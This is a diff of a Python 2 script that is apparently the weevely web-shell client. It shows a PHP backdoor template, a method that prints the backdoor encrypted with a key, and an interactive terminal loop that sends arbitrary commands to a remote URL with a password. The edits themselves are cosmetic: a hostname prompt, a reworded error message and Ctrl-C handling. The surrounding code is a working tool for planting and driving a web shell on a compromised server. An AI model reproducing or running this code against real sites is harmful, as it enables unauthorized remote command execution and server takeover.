@@ -3,12 +3,6 @@
 from numpy import frombuffer, bitwise_xor, byte
 import getopt, sys, base64, os, urllib2, re, urlparse
     
-    
-    
-#e = re.compile("=(.*)")
-#print e.findall("?asd=cu&asd2=cu2&asd3=cu3")[0]    
-
-
 back="""
 $ref[1] = base64_decode($ref[1]);
 switch($ref[2]){
@@ -133,7 +127,7 @@ class weevely:
       e = re.compile(restring,re.DOTALL)
       founded=e.findall(ret)
       if len(founded)<1:
-	raise Exception('request doesn\'t produce a valid respond')
+	raise Exception('test request doesn\'t produce a valid respond')
       else:
 	return founded[0].strip()
     
@@ -144,6 +138,9 @@ class weevely:
     return r.read()
     
   def terminal(self, url, pwd):
+    
+    hostname=urlparse.urlparse(url)[1]
+    
     try:
       ret = self.execute(url, pwd, "echo " + pwd, 0)
     except Exception, e:
@@ -155,18 +152,25 @@ class weevely:
       return
     else:
       while True:
-	print "> ",
+	print hostname + '> ',
 	cmnd = sys.stdin.readline()
 	if cmnd!='\n':
 	  print self.execute(url, pwd, cmnd, 0)
 
   def generate(self,key,path):
     print self.crypt(back,key)
+     
     
 if __name__ == "__main__":
     
+    
     app=weevely()
-    app.main()
+    try:
+      app.main()
+    except KeyboardInterrupt:
+      print '\n! Received keyboard interrupt, exiting.'
+      
+      
     
     
    
